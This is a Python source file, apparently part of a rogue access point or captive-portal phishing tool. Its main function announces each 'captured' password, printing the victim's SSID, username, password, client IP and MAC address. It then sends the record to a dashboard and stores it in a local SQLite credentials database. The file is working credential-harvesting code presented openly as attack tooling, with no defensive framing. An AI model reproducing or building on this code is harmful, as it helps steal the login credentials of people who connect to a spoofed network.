import os
import sqlite3
from colorama import Fore, Style
from utilities.dashboard import dashboard


def notify_password_captured(credentials):
    """Function to notify when password is captured"""
    print(Fore.YELLOW + Style.BRIGHT + "\n[!] ALERT: Password captured!\n"
                                       f"    Timestamp  : {credentials['timestamp']}\n"
                                       f"    SSID       : {credentials['ssid']}\n"
                                       f"    Username   : {credentials['username']}\n"
                                       f"    Password   : {credentials['password']}\n"
                                       f"    Client IP  : {credentials['client_ip']}\n"
                                       f"    MAC Address: {credentials['mac_address']}" + Style.RESET_ALL)

    dashboard.add_credential(credentials)  # send to dashboard

    os.makedirs("settings", exist_ok=True)

    conn = sqlite3.connect("settings/creds.db")  # connect to SQLite database
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        ssid TEXT NOT NULL,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        client_ip TEXT NOT NULL,
        mac_address TEXT NOT NULL,
        user_agent TEXT NOT NULL
    )
    """)

    cursor.execute("""
    INSERT INTO credentials (timestamp, ssid, username, password, client_ip, mac_address, user_agent)
    VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (
        credentials["timestamp"],
        credentials["ssid"],
        credentials["username"],
        credentials["password"],
        credentials["client_ip"],
        credentials["mac_address"],
        credentials["user_agent"]
    ))

    conn.commit()
    conn.close()


def clear_screen():
    os.system('clear')
